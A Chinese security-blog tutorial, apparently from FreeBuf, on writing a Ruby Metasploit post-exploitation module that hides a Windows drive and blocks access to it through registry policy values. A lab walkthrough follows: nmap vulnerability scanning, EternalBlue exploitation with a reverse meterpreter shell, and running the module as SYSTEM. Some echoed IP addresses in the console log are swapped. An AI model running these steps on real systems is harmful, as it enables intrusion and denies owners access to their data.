@@ -1,0 +1,275 @@
+***本文原创作者：Neroqi，本文属于FreeBuf原创奖励计划，未经许可禁止转载**
+
+ ***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**  
+
+## 前言
+
+**后渗透模块，顾名思义是在成功渗透目标主机之后进行操作的模块，这类模块可以达到某种或某些特定的目的。在Metasploit中，模块是后缀名为.rb的文件，它是利用Ruby编写的程序。本文详细描述了如何利用Ruby编写隐藏和禁止访问特定驱动器的后渗透模块、如何在Metasploit中加载该后渗透模块以及如何在meterpreter中利用该后渗透模块的过程。**![image.png](https://image.3001.net/images/20190503/1556868471_5ccbed7760ee4.png!small)
+
+## 实验环境
+
+    
+    
+    1.渗透主机：Kali-Linux-2019.1-vm-amd64
+    2.目标主机：Windows Server 2008 R2
+    3.软件版本：Metasploit v5.0.2
+    
+
+### 编写后渗透模块
+
+ **1.模块的第一部分如下所示：**
+
+    
+    
+    # This module requires Metasploit: https://metasploit.com/download
+    # This module is used to hide and restrict access to a particular drive
+    # after you have successfully penetrated a server
+    require 'rex'
+    require 'msf/core'
+    require 'msf/core/post/windows/registry'
+    class MetasploitModule < Msf::Post
+      include Msf::Post::Windows::Registry
+      def initialize 
+      super(
+    	  'Description'=> 'This module is used to hide and restrict access to a particular drive',
+    	  'License'=> MSF_LICENSE,
+    	  'Author'=> 'Neroqi',
+    	   )
+      register_options(
+        [ OptString.new('DriveCharacter', [true,'Please SET the Drive Character'])], 
+          self.class)
+      end  
+    
+
+Metasploit的模块编写建议从注释开始，注释语句以“#”开头，注释能够增强模块的可读性，方便他人和自己以后的阅读使用。
+
+require 'rex'引入了Metasploit中rex库的所有内容；require
+'msf/core'引入了Metasploit中core库的所有内容；require
+'msf/core/post/windows/registry'引入了registry.rb库文件，用于后续操作目标主机的注册表。
+
+class MetasploitModule < Msf::Post表示将该模块定义为Post类型，即后渗透模块类型。
+
+方法initialize定义了模块的相关信息及参数，其中register_options使用OptString.new函数定义了一个字符串变量DriveCharacter，用于存储盘符。
+
+ **2.模块的第二部分如下所示：**
+
+    
+    
+      def drive_converter(drive)
+    	case drive
+    	when "A"
+    	  return 1
+    	when "B"
+    	  return 2
+    	when "C"
+    	  return 4
+    	when "D"
+    	  return 8
+    	when "E"
+    	  return 16
+    	when "F"
+    	  return 32
+    	when "G"
+    	  return 64
+    	end
+      end  
+    
+
+这一部分涉及到盘符掩码的计算过程。其实很简单，利用公式2^(N-1)即可，其中N为盘符字母在26个英文字母表中的位置，比如C在字母表中的位置为3，因此返回2^(3-1)=4，其他盘符以此类推。
+
+由于服务器可能外挂存储阵列，因此盘符可能不止到字母“G” ，这一部分可以自行修改。
+
+ **3.模块的第三部分如下所示：**
+
+    
+    
+      def run 
+    	drive_int = drive_converter(datastore['DriveCharacter'])
+    	registry_path = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+    	exists = meterpreter_registry_key_exist?(registry_path)
+    	if exists 
+    		print_good("Registry Path Exists, Creating Values Directly!")
+    		meterpreter_registry_setvaldata(registry_path, 'NoDrives', drive_int.to_s, 'REG_DWORD', REGISTRY_VIEW_64_BIT)
+    		print_good("Hiding #{datastore['DriveCharacter']} Drive")
+    		meterpreter_registry_setvaldata(registry_path,'NoViewOnDrive', drive_int.to_s,'REG_DWORD', REGISTRY_VIEW_64_BIT)
+    		print_good("Restricting Access to #{datastore['DriveCharacter']} Drive")
+    	else 
+    		print_error("Registry Path Doesn't Exist, Creating Path Firstly!")
+    		registry_createkey(registry_path)
+    		meterpreter_registry_setvaldata(registry_path,'NoDrives', drive_int.to_s,'REG_DWORD', REGISTRY_VIEW_64_BIT)
+    		print_good("Hiding #{datastore['DriveCharacter']} Drive")
+    		meterpreter_registry_setvaldata(registry_path,'NoViewOnDrive', drive_int.to_s,'REG_DWORD', REGISTRY_VIEW_64_BIT)
+    		print_good("Restricting Access to #{datastore['DriveCharacter']} Drive")
+            end 
+        print_good("Disabled #{datastore['DriveCharacter']} Drive Successfully!")
+      end
+    
+    
+    registry_path = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+
+此处的HKLM表示注册表中的HKEY_LOCAL_MACHINE，但是这样简写是否可行？Windows Server 2008 R2的注册表是下面这样的啊。
+
+![image.png](https://image.3001.net/images/20190503/1556868906_5ccbef2a00f81.png!small)莫慌，路径补全的工作已经有人偷偷帮我们做了，在registry.rb库文件中有一段代码完成了这项工作，具体如下：  
+
+    
+    
+      def registry_hive_lookup(hive)
+        case hive
+        when 'HKCR'
+          HKEY_LOCAL_MACHINE
+        when 'HKCU'
+          HKEY_CURRENT_USER
+        when 'HKLM'
+          HKEY_LOCAL_MACHINE
+        when 'HKU'
+          HKEY_USERS
+        when 'HKPD'
+          HKEY_PERFORMANCE_DATA
+        when 'HKCC'
+          HKEY_CURRENT_CONFIG
+        when 'HKDD'
+          HKEY_DYN_DATA
+        else
+          HKEY_LOCAL_MACHINE
+        end
+      end
+    
+    
+    registry_path = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
+
+此处是在注册表的HKLM（HKEY_LOCAL_MACHINE）中，这里的HKLM也可以修改为HKCU（HKEY_CURRENT_USER）。这两者的区别在于：在成功渗透目标主机之后，若可以取得目标主机的system权限，那么就可以使用HKLM修改系统级别的注册表；若只能取得某一用户的权限，那么退而求其次，使用HKCU修改当前用户的注册表。
+
+    
+    
+    exists = meterpreter_registry_key_exist?(registry_path)
+
+用于判断目标主机的注册表中是否存在该路径，为下面的if-else语句提供判断依据。
+
+在Windows中通过创建NoDrives和NoViewOnDrive这两个注册表值，可以实现隐藏并禁止访问指定盘符。
+
+我们的预期是在meterpreter会话中使用该后渗透模块，于是使用函数meterpreter_registry_setvaldata来设置NoDrives和NoViewOnDrive的值。由于目标主机是64位系统，所以在meterpreter_registry_setvaldata函数中使用的是参数REGISTRY_VIEW_64_BIT；如果目标主机是32位系统，那么使用参数REGISTRY_VIEW_32_BIT。
+
+### 测试后渗透模块
+
+经过上面的步骤，后渗透模块的编写已经完成，接下来进行模块的测试。
+
+ **1.将编写好的后渗透模块disable_drive_Neroqi.rb拷贝到如下路径：**
+
+    
+    
+    /usr/share/metasploit-framework/modules/post/windows/manage
+
+要将模块成功加载到Metasploit中，还需要在msfconsole中reload_all。若模块存在错误，那么msfconsole会返回详细的报错信息，然后根据报错信息相应地去修改自己的代码即可；若模块正确无误，则msfconsole的返回信息如下图所示（reload_all之前是326个post模块，之后是327个post模块）：
+
+![image.png](https://image.3001.net/images/20190503/1556869376_5ccbf100cfe56.png!small)
+
+ **2.使用nmap扫描目标主机，nmap命令如下：**
+
+    
+    
+    root@kali:~# nmap -sV -p - --script vuln --script-args unsafe 192.168.110.130  
+    
+
+发现目标主机中存在ms17_010的漏洞，扫描结果如下图所示：
+
+![image.png](https://image.3001.net/images/20190503/1556869470_5ccbf15e01124.png!small)
+
+**3.为进一步确认目标主机中的ms17_010漏洞，防止nmap误报，我们在msfconsole中使用auxiliary/scanner/smb/smb_ms17_010模块，确定ms17_010漏洞是否可以利用，操作如下：**
+
+    
+    
+    msf5 > use auxiliary/scanner/smb/smb_ms17_010 
+    msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.110.130
+    RHOSTS => 192.168.110.130
+    msf5 auxiliary(scanner/smb/smb_ms17_010) > run  
+    
+
+基本确认该ms17_010漏洞可以利用，确认结果如下图所示：
+
+![image.png](https://image.3001.net/images/20190503/1556879699_5ccc195306466.png!small)
+
+**4.利用exploit/windows/smb/ms17_010_eternalblue模块对目标主机进行渗透，建立与目标主机之间的meterpreter会话，操作如下：**
+
+    
+    
+    msf5 > use exploit/windows/smb/ms17_010_eternalblue
+    msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.110.130
+    RHOST => 192.168.110.132
+    msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+    payload => windows/x64/meterpreter/reverse_tcp
+    msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.110.132
+    LHOST => 192.168.110.130
+    msf5 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 8000
+    LPORT => 8000
+    msf5 exploit(windows/smb/ms17_010_eternalblue) > run  
+    
+
+ **5.可以看到我们取得了目标主机的system权限，如下图所示：**
+
+![image.png](https://image.3001.net/images/20190503/1556879847_5ccc19e76c0f2.png!small)
+**6.对于情况未知的目标主机，可以使用post/windows/gather/forensics/enum_drives模块来枚举分区信息，为后续执行disable_drive_Neroqi.rb模块提供依据，在执行enum_drives模块之前，需要通过background将meterpreter会话转为后台运行，具体操作如下：**  
+
+    
+    
+    meterpreter > background
+    [*] Backgrounding session 1...
+    msf5 > sessions
+    Active sessions
+    ===============
+    
+      Id  Name  Type                     Information                            Connection
+      --  ----  ----                     -----------                            ----------      1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-3E5KJEFP436  192.168.110.132:8000 -> 192.168.110.130:49280 (192.168.110.130)
+    msf5 > use post/windows/gather/forensics/enum_drives 
+    msf5 post(windows/gather/forensics/enum_drives) > show options
+    
+    Module options (post/windows/gather/forensics/enum_drives):
+    
+       Name       Current Setting  Required  Description
+       ----       ---------------  --------  -----------       MAXDRIVES  10               no        Maximum physical drive number
+       SESSION                     yes       The session to run this module on.
+    
+    msf5 post(windows/gather/forensics/enum_drives) > set SESSION 1
+    SESSION => 1
+    msf5 post(windows/gather/forensics/enum_drives) > run
+    
+    Device Name:                    Type:   Size (bytes):
+    ------------                    -----   -------------    
+    \\.\PhysicalDrive0                   4702111234474983745
+    
+    \\.\C:                               4702111234474983745
+    \\.\D:                               4702111234474983745
+    \\.\E:                               4702111234474983745
+    [*] Post module execution completed  
+    
+
+**7.在msf中选择编写的后渗透模块disable_drive_Neroqi.rb，设置DriveCharacter和SESSION，其中DriveCharacter为盘符字母（此处设为D），SESSION为转为后台运行的meterpreter会话id（此处id为1），操作如下：**  
+
+    
+    
+    msf5 > use post/windows/manage/disable_drive_Neroqi 
+    msf5 post(windows/manage/disable_drive_Neroqi) > set DriveCharacter D
+    DriveCharacter => D
+    msf5 post(windows/manage/disable_drive_Neroqi) > set SESSION 1
+    SESSION => 1
+    msf5 post(windows/manage/disable_drive_Neroqi) > run  
+    
+
+ **8.在设置好模块disable_drive_Neroqi的参数之后，run这个后渗透模块，输出信息如下：  
+**
+
+![image.png](https://image.3001.net/images/20190503/1556880090_5ccc1adae696b.png!small)
+**9.登录到目标主机中，验证攻击是否成功，主机的注册表如下图所示，此时在注册表中NoDrives和NoViewOnDrive已经成功写入：**  
+
+![image.png](https://image.3001.net/images/20190503/1556880110_5ccc1aeead270.png!small)
+打开“我的电脑”，可以看到D盘已经消失，如下图所示：  
+
+![image.png](https://image.3001.net/images/20190503/1556880133_5ccc1b0594277.png!small)在“磁盘管理”中尝试打开D盘，系统报错，无法访问D盘，如下图所示：  
+
+![image.png](https://image.3001.net/images/20190503/1556880151_5ccc1b1793310.png!small)
+
+## 结束语
+
+以上这些，就是关于如何利用Ruby编写后渗透模块、如何加载以及利用后渗透模块的过程，大家有兴趣的话，可以尝试利用Ruby编写自己的渗透模块并且进行相关测试。
+
+ ***本文原创作者：Neroqi，本文属于FreeBuf原创奖励计划，未经许可禁止转载**
+
